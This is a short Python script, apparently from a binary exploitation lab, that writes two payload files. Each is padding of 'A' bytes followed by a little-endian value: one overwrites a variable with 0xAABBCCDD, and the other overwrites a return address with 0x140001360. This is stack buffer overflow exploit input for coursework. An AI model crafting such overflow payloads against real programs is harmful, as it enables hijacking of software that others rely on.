#part1
with open("1_1_input.txt", "wb") as f:
    f.write(b"A" * 16 + b"\xDD\xCC\xBB\xAA\x00")
    
#part2
#adres: 00 00 00 01 40 00 13 60

with open("2_1_input.txt", "wb") as f:
    f.write(b"A" * 40 + b"\x60\x13\x00\x40\x01\x00\x00\x00")
    